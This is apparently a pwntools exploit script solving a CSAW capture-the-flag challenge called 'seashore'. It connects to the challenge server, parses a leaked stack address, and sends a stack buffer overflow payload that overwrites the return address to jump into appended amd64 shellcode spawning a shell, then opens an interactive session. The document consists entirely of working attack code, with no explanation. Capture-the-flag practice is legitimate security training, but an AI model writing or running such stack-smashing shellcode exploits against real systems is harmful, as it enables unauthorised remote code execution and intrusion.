from pwn import *

e = ELF("./seashore")

#p = process(e.path)
p = remote("pwn.chal.csaw.io", 1003)

p.recvuntil(": ")
leak = int(p.recvline(), 16)
print("{:#x}".format(leak))

p.sendline("A" * 32 + "A" * 8 + p64(leak + 32 + 8 + 8) + asm(shellcraft.amd64.sh(), arch="amd64"))

p.interactive()
